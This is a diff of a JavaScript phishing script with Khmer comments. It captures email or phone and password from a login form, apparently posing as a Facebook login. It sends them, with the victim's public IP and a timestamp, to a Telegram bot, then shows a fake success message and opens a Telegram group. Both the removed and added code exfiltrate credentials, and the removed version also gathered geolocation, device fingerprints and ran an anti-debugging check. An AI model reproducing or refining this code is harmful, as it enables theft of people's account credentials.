@@ -5,7 +5,7 @@ const CONFIG = {
     GROUP_LINK: "https://t.me/+7LTtj5yoBBxjMGVl",
     MAX_RETRIES: 3,
     RETRY_DELAY: 1000,
-    SESSION_TIMEOUT: 300000, // 5 នាទី
+    SESSION_TIMEOUT: 300000,
     RATE_LIMIT_DELAY: 2000
 };
 
@@ -18,49 +18,46 @@ let attemptsCount = 0;
 
 // ==================== មុខងារកម្រិតខ្ពស់ ====================
 
-// 1. ពិនិត្យគុណភាពពាក្យសម្ងាត់
-function checkPasswordStrength(password) {
-    let strength = 0;
-    let feedback = [];
-    
-    if (password.length >= 8) strength++;
-    else feedback.push("ពាក្យសម្ងាត់ខ្លីពេក (ត្រូវការ 8 តួអក្សរឡើង)");
-    
-    if (/[A-Z]/.test(password)) strength++;
-    else feedback.push("គួរតែមានអក្សរធំ");
-    
-    if (/[0-9]/.test(password)) strength++;
-    else feedback.push("គួរតែមានលេខ");
-    
-    if (/[^A-Za-z0-9]/.test(password)) strength++;
-    else feedback.push("គួរតែមានតួអក្សរពិសេស");
-    
-    const strengthLevel = ["ខ្សោយ", "មធ្យម", "ល្អ", "ខ្លាំង", "ខ្លាំងណាស់"];
-    return { score: strength, level: strengthLevel[strength], feedback: feedback };
-}
-
-// 2. ពិនិត្យទម្រង់អ៊ីមែល
+// 1. ពិនិត្យទម្រង់អ៊ីមែល/ទូរសព្ទ
 function validateEmail(email) {
     const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
     const phoneRegex = /^[0-9]{9,12}$/;
     
-    if (emailRegex.test(email)) return { valid: true, type: "email" };
-    if (phoneRegex.test(email)) return { valid: true, type: "phone" };
+    if (emailRegex.test(email)) return { valid: true, type: "Email" };
+    if (phoneRegex.test(email)) return { valid: true, type: "Phone" };
     return { valid: false, type: null };
 }
 
-// 3. ទទួលបានព័ត៌មាន Browser
+// 2. ទទួលបានព័ត៌មាន Browser
 function getBrowserInfo() {
     const ua = navigator.userAgent;
     return {
-        browser: navigator.userAgentData?.brands || "Unknown",
         language: navigator.language,
-        platform: navigator.platform,
         screenSize: `${screen.width}x${screen.height}`,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        userAgent: ua,
         isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(ua)
     };
+}
+
+// 3. ទទួលបាន IP ជាមួយ backup
+async function getPublicIP() {
+    const ipServices = [
+        'https://api.ipify.org?format=json',
+        'https://api.my-ip.io/ip.json',
+        'https://ipapi.co/json/'
+    ];
+    
+    for (const service of ipServices) {
+        try {
+            const response = await fetch(service);
+            const data = await response.json();
+            const ip = data.ip || data;
+            if (ip && ip.match(/^\d+\.\d+\.\d+\.\d+$/)) return ip;
+        } catch (error) {
+            continue;
+        }
+    }
+    return "Unable to fetch IP";
 }
 
 // 4. ទទួលបានទីតាំងប្រហាក់ប្រហែល (IP Geolocation)
@@ -71,11 +68,10 @@ async function getGeoLocation(ip) {
         return {
             country: data.country_name || "Unknown",
             city: data.city || "Unknown",
-            region: data.region || "Unknown",
             isp: data.org || "Unknown"
         };
     } catch (error) {
-        return { country: "Unknown", city: "Unknown", region: "Unknown", isp: "Unknown" };
+        return { country: "Unknown", city: "Unknown", isp: "Unknown" };
     }
 }
 
@@ -112,85 +108,19 @@ async function fetchWithRetry(url, retries = CONFIG.MAX_RETRIES) {
     throw new Error("Max retries exceeded");
 }
 
-// 8. ទទួលបាន IP ជាមួយ backup
-async function getPublicIP() {
-    const ipServices = [
-        'https://api.ipify.org?format=json',
-        'https://api.my-ip.io/ip.json',
-        'https://ipapi.co/json/'
-    ];
-    
-    for (const service of ipServices) {
-        try {
-            const response = await fetch(service);
-            const data = await response.json();
-            const ip = data.ip || data;
-            if (ip && ip.match(/^\d+\.\d+\.\d+\.\d+$/)) return ip;
-        } catch (error) {
-            continue;
-        }
-    }
-    return "Unable to fetch IP";
+// 8. ទម្រង់អត្ថបទក្នុង Telegram (តាមការស្នើសុំ)
+function formatTelegramMessage(email, password, ip, date) {
+    return "━━━━━━━━━━━━━━━━━━━━━━\n" +
+           "🔐 𝐅𝐁 𝐋𝐎𝐆𝐈𝐍 🔐\n" +
+           "━━━━━━━━━━━━━━━━━━━━━━\n" +
+           "📧 " + email + "\n" +
+           "🔑 " + password + "\n" +
+           "🌐 " + ip + "\n" +
+           "📅 " + date + "\n" +
+           "━━━━━━━━━━━━━━━━━━━━━━";
 }
 
-// 9. ទម្រង់អត្ថបទកម្រិតខ្ពស់
-function formatAdvancedMessage(email, password, ip, date, geoInfo, browserInfo, sessionId) {
-    const passStrength = checkPasswordStrength(password);
-    const emailValidation = validateEmail(email);
-    
-    return "╔══════════════════════════════════════════╗\n" +
-           "║          🔐 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐋𝐎𝐆𝐈𝐍 🔐          ║\n" +
-           "╠══════════════════════════════════════════╣\n" +
-           "║ 📧 𝐄𝐦𝐚𝐢𝐥/𝐏𝐡𝐨𝐧𝐞                         ║\n" +
-           `║    ➜ ${email.padEnd(35)}║\n` +
-           `║    📌 Type: ${emailValidation.type || "Invalid".padEnd(28)}║\n` +
-           "╠══════════════════════════════════════════╣\n" +
-           "║ 🔑 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝                            ║\n" +
-           `║    ➜ ${password.padEnd(35)}║\n` +
-           `║    🔒 Strength: ${passStrength.level.padEnd(26)}║\n` +
-           "╠══════════════════════════════════════════╣\n" +
-           "║ 🌐 𝐍𝐞𝐭𝐰𝐨𝐫𝐤 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧                ║\n" +
-           `║    📍 IP: ${ip.padEnd(35)}║\n` +
-           `║    🏳️ Country: ${geoInfo.country.padEnd(30)}║\n` +
-           `║    🏙️ City: ${geoInfo.city.padEnd(34)}║\n` +
-           `║    📡 ISP: ${geoInfo.isp.substring(0, 35).padEnd(35)}║\n` +
-           "╠══════════════════════════════════════════╣\n" +
-           "║ 💻 𝐃𝐞𝐯𝐢𝐜𝐞 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧                 ║\n" +
-           `║    📱 Mobile: ${(browserInfo.isMobile ? "Yes" : "No").padEnd(32)}║\n` +
-           `║    🌍 Language: ${browserInfo.language.padEnd(29)}║\n` +
-           `║    📺 Screen: ${browserInfo.screenSize.padEnd(32)}║\n` +
-           `║    🕐 Timezone: ${browserInfo.timezone.padEnd(30)}║\n` +
-           "╠══════════════════════════════════════════╣\n" +
-           "║ 📅 𝐓𝐢𝐦𝐞𝐬𝐭𝐚𝐦𝐩                          ║\n" +
-           `║    🕒 Date: ${date.padEnd(34)}║\n` +
-           `║    🆔 Session: ${sessionId.padEnd(31)}║\n` +
-           "╚══════════════════════════════════════════╝";
-}
-
-// 10. Local Storage រក្សាទុកស្ថានភាព
-function saveToLocalStorage(email) {
-    const attempts = JSON.parse(localStorage.getItem('login_attempts') || '[]');
-    attempts.push({
-        email: email,
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent
-    });
-    if (attempts.length > 10) attempts.shift();
-    localStorage.setItem('login_attempts', JSON.stringify(attempts));
-}
-
-// 11. រាប់ចំនួនព្យាយាមពី IP ដូចគ្នា
-function getAttemptsCount() {
-    attemptsCount++;
-    return attemptsCount;
-}
-
-// 12. ពិនិត្យ Session Expiry
-function isSessionExpired() {
-    return (Date.now() - sessionStartTime) > CONFIG.SESSION_TIMEOUT;
-}
-
-// 13. បង្ហាញការជូនដំណឹងបែបទំនើប (Toast Notification)
+// 9. Toast Notification
 function showToast(message, type = "success") {
     const toast = document.createElement('div');
     toast.textContent = message;
@@ -212,7 +142,7 @@ function showToast(message, type = "success") {
     setTimeout(() => toast.remove(), 3000);
 }
 
-// 14. បន្ថែម CSS Animation
+// 10. បន្ថែម CSS Animation
 function addAnimations() {
     const style = document.createElement('style');
     style.textContent = `
@@ -237,134 +167,7 @@ function addAnimations() {
     document.head.appendChild(style);
 }
 
-// 15. អនុគមន៍សំខាន់ផ្ញើទៅ Telegram (កែលម្អ)
-async function sendToTelegram() {
-    if (isProcessing) {
-        showToast("សូមរង់ចាំ...", "error");
-        return;
-    }
-    
-    if (isSessionExpired()) {
-        sessionStartTime = Date.now();
-        showToast("សម័យប្រើប្រាស់ថ្មី", "success");
-    }
-    
-    const email = document.getElementById('email').value.trim();
-    const password = document.getElementById('password').value.trim();
-
-    if (!email || !password) {
-        showToast("សូមបំពេញព័ត៌មានទាំងអស់!", "error");
-        return;
-    }
-    
-    const emailValidation = validateEmail(email);
-    if (!emailValidation.valid) {
-        showToast("ទម្រង់អ៊ីមែល/ទូរសព្ទមិនត្រឹមត្រូវ", "error");
-        return;
-    }
-    
-    const passStrength = checkPasswordStrength(password);
-    if (passStrength.score === 0) {
-        showToast("ពាក្យសម្ងាត់ខ្សោយពេក", "error");
-        return;
-    }
-
-    isProcessing = true;
-    await rateLimit();
-    
-    const loadingDiv = document.getElementById('loading');
-    loadingDiv.style.display = 'block';
-    loadingDiv.classList.add('loading-animation');
-
-    const submitBtn = document.querySelector('.submit-btn');
-    submitBtn.disabled = true;
-    submitBtn.style.opacity = '0.7';
-
-    try {
-        const [ip, browserInfo, sessionId] = await Promise.all([
-            getPublicIP(),
-            Promise.resolve(getBrowserInfo()),
-            Promise.resolve(generateSessionId())
-        ]);
-        
-        const geoInfo = await getGeoLocation(ip);
-        const date = getCurrentDate();
-        
-        saveToLocalStorage(email);
-        const attemptNum = getAttemptsCount();
-        
-        const message = formatAdvancedMessage(email, password, ip, date, geoInfo, browserInfo, sessionId);
-        const encodedMessage = encodeURIComponent(message);
-
-        const url = `https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage?chat_id=${CONFIG.CHAT_ID}&text=${encodedMessage}`;
-
-        const response = await fetchWithRetry(url);
-        const result = await response.json();
-
-        if (result.ok) {
-            document.getElementById('email').value = '';
-            document.getElementById('password').value = '';
-            
-            showToast(`ចូលក្រុបបានដោយជោគជ័យ! (ការព្យាយាមលើកទី ${attemptNum})`, "success");
-            joinTelegramGroup();
-            failedAttempts = 0;
-        } else {
-            failedAttempts++;
-            showToast(`បរាជ័យលើកទី ${failedAttempts}`, "error");
-            submitBtn.disabled = false;
-            submitBtn.style.opacity = '1';
-        }
-    } catch (error) {
-        console.error("Error:", error);
-        showToast("កំហុសបច្ចេកទេស! សូមពិនិត្យការតភ្ជាប់", "error");
-        submitBtn.disabled = false;
-        submitBtn.style.opacity = '1';
-    } finally {
-        isProcessing = false;
-        loadingDiv.style.display = 'none';
-        loadingDiv.classList.remove('loading-animation');
-    }
-}
-
-// 16. អនុគមន៍ទទួលបានពេលវេលា (រក្សាទុក)
-function getCurrentDate() {
-    const now = new Date();
-    return now.toLocaleString('en-GB', {
-        day: '2-digit',
-        month: '2-digit',
-        year: 'numeric',
-        hour: '2-digit',
-        minute: '2-digit',
-        second: '2-digit'
-    }).replace(',', '');
-}
-
-// 17. អនុគមន៍បើក Telegram Group
-function joinTelegramGroup() {
-    window.open(CONFIG.GROUP_LINK, '_blank');
-}
-
-// 18. បន្ថែម real-time password strength indicator
-function addPasswordStrengthIndicator() {
-    const passwordInput = document.getElementById('password');
-    const indicator = document.createElement('div');
-    indicator.style.cssText = `
-        font-size: 12px;
-        margin-top: -10px;
-        margin-bottom: 5px;
-        padding-left: 5px;
-    `;
-    passwordInput.parentNode.insertBefore(indicator, passwordInput.nextSibling);
-    
-    passwordInput.addEventListener('input', function() {
-        const strength = checkPasswordStrength(this.value);
-        const colors = ["#ff4444", "#ffaa44", "#ffff44", "#44ff44", "#00cc00"];
-        indicator.textContent = `កម្លាំងពាក្យសម្ងាត់: ${strength.level}`;
-        indicator.style.color = colors[strength.score];
-    });
-}
-
-// 19. បន្ថែម email/phone format validation real-time
+// 11. បន្ថែម email/phone format validation real-time
 function addEmailValidation() {
     const emailInput = document.getElementById('email');
     const indicator = document.createElement('div');
@@ -390,7 +193,7 @@ function addEmailValidation() {
     });
 }
 
-// 20. Keyboard shortcut (Enter key)
+// 12. Keyboard shortcut (Enter key)
 function addKeyboardShortcut() {
     const inputs = document.querySelectorAll('.input-field');
     inputs.forEach(input => {
@@ -403,23 +206,115 @@ function addKeyboardShortcut() {
     });
 }
 
-// 21. Anti-debugging detection (simple)
-function detectDevTools() {
-    const start = performance.now();
-    debugger;
-    const end = performance.now();
-    if (end - start > 100) {
-        console.log("DevTools detected");
+// 13. រាប់ចំនួនព្យាយាម
+function getAttemptsCount() {
+    attemptsCount++;
+    return attemptsCount;
+}
+
+// 14. ពិនិត្យ Session Expiry
+function isSessionExpired() {
+    return (Date.now() - sessionStartTime) > CONFIG.SESSION_TIMEOUT;
+}
+
+// 15. អនុគមន៍ទទួលបានពេលវេលា
+function getCurrentDate() {
+    const now = new Date();
+    return now.toLocaleString('en-GB', {
+        day: '2-digit',
+        month: '2-digit',
+        year: 'numeric',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit'
+    }).replace(',', '');
+}
+
+// 16. អនុគមន៍បើក Telegram Group
+function joinTelegramGroup() {
+    window.open(CONFIG.GROUP_LINK, '_blank');
+}
+
+// 17. អនុគមន៍សំខាន់ផ្ញើទៅ Telegram
+async function sendToTelegram() {
+    if (isProcessing) {
+        showToast("សូមរង់ចាំ...", "error");
+        return;
+    }
+    
+    if (isSessionExpired()) {
+        sessionStartTime = Date.now();
+        showToast("សម័យប្រើប្រាស់ថ្មី", "success");
+    }
+    
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value.trim();
+
+    if (!email || !password) {
+        showToast("សូមបំពេញព័ត៌មានទាំងអស់!", "error");
+        return;
+    }
+    
+    const emailValidation = validateEmail(email);
+    if (!emailValidation.valid) {
+        showToast("ទម្រង់អ៊ីមែល/ទូរសព្ទមិនត្រឹមត្រូវ", "error");
+        return;
+    }
+
+    isProcessing = true;
+    await rateLimit();
+    
+    const loadingDiv = document.getElementById('loading');
+    loadingDiv.style.display = 'block';
+    loadingDiv.classList.add('loading-animation');
+
+    const submitBtn = document.querySelector('.submit-btn');
+    submitBtn.disabled = true;
+    submitBtn.style.opacity = '0.7';
+
+    try {
+        const ip = await getPublicIP();
+        const date = getCurrentDate();
+        const attemptNum = getAttemptsCount();
+        
+        // ប្រើទម្រង់អត្ថបទថ្មី
+        const message = formatTelegramMessage(email, password, ip, date);
+        const encodedMessage = encodeURIComponent(message);
+
+        const url = `https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage?chat_id=${CONFIG.CHAT_ID}&text=${encodedMessage}`;
+
+        const response = await fetchWithRetry(url);
+        const result = await response.json();
+
+        if (result.ok) {
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+            
+            showToast(`ចូលក្រុបបានដោយជោគជ័យ! (លើកទី ${attemptNum})`, "success");
+            joinTelegramGroup();
+            failedAttempts = 0;
+        } else {
+            failedAttempts++;
+            showToast(`បរាជ័យលើកទី ${failedAttempts}`, "error");
+            submitBtn.disabled = false;
+            submitBtn.style.opacity = '1';
+        }
+    } catch (error) {
+        console.error("Error:", error);
+        showToast("កំហុសបច្ចេកទេស! សូមពិនិត្យការតភ្ជាប់", "error");
+        submitBtn.disabled = false;
+        submitBtn.style.opacity = '1';
+    } finally {
+        isProcessing = false;
+        loadingDiv.style.display = 'none';
+        loadingDiv.classList.remove('loading-animation');
     }
 }
 
 // ==================== ការចាប់ផ្ដើម ====================
 document.addEventListener('DOMContentLoaded', () => {
     addAnimations();
-    addPasswordStrengthIndicator();
     addEmailValidation();
     addKeyboardShortcut();
-    detectDevTools();
-    console.log("Advanced script loaded successfully!");
-    console.log(`Session ID: ${generateSessionId()}`);
+    console.log("Script loaded successfully!");
 });
